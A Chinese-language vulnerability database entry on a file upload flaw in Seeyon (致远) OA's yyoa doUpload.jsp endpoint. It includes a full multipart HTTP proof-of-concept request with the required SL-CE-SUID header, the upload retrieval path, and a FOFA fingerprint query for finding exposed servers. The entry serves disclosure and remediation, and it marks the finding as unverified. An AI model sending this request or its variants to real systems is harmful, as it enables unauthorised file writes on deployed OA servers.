---
source: "https://github.com/R4gd0ll/I-Wanna-Get-All/blob/d8b866af4baed03a338ce8485c25b53875461776/src/main/java/exp/oa/seeyonoa/yyoa/seeyon_yyoa_doUpload_upload.java"
title: "致远yyoa doUpload.jsp文件上传"
product: "致远yyoa"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "具体版本未知；SL-CE-SUID89条件及目录访问"
prerequisites: "特殊身份头存在，不能称无身份条件"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA-yyoa-doUpload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"致远互联-OA\""
id: "vw-20ae3795d13725b86756cf61"
entity_id: "ve-20ae3795d13725b86756cf61"
schema_version: "1"
source_url: "https://github.com/R4gd0ll/I-Wanna-Get-All/blob/d8b866af4baed03a338ce8485c25b53875461776/src/main/java/exp/oa/seeyonoa/yyoa/seeyon_yyoa_doUpload_upload.java"
---

# 致远yyoa doUpload.jsp文件上传

## 条目说明

- 对象与具体问题：致远yyoa；doUpload.jsp文件上传
- 版本、配置及部署条件：具体版本未知；SL-CE-SUID89条件及目录访问
- 认证与权限前提：特殊身份头存在，不能称无身份条件
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 明确myfile、返回文件名传递、文本落地与脚本执行不同
- 固定commit源码来源，明确原200判断过宽；没有把JSP后缀当执行证据
- 仍缺最低权限、厂商补丁，保留当前限定

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

致远 OA yyoa 的 `/yyoa/portal/tools/doUpload.jsp` 被公开 PoC 列为文件上传入口。源码通过 `myfile` 表单字段上传 JSP 扩展名的纯文本内容，并在 `/yyoa/portal/upload/` 下访问返回的文件名。文件落地与脚本执行是不同结论。

### 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

### 公开验证方法

```http
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Host: example.invalid
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
SL-CE-SUID: 89

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="myfile"; filename="R4g.jsp"
Content-Type: application/octet-stream

Hello R4g
--59229605f98b8cf290a7b8908b34616b--
```

来源的 `att()` 使用纯文本 `Hello R4g`，并调用 `doUpload()` 从响应提取文件名后访问 `/yyoa/portal/upload/<返回的文件名>`。原代码只要求后续访问返回 200；人工核对应进一步确认相同文件内容，排除错误页。`SL-CE-SUID: 89` 是来源请求条件，不能遗漏后再宣称完全无身份条件。本文没有上传 JSP 代码，也不把纯文本读取写成代码执行；仅静态核对公开源码。

### 修复建议

向致远获取适用更新。对上传接口实施服务端身份与权限校验，限制文件类型及存储目录，并禁止上传目录执行脚本。

### 参考链接

- [R4gd0ll/I-Wanna-Get-All 原始 PoC（固定提交）](https://github.com/R4gd0ll/I-Wanna-Get-All/blob/d8b866af4baed03a338ce8485c25b53875461776/src/main/java/exp/oa/seeyonoa/yyoa/seeyon_yyoa_doUpload_upload.java)

### 网络测绘

```text
app="致远互联-OA"
```
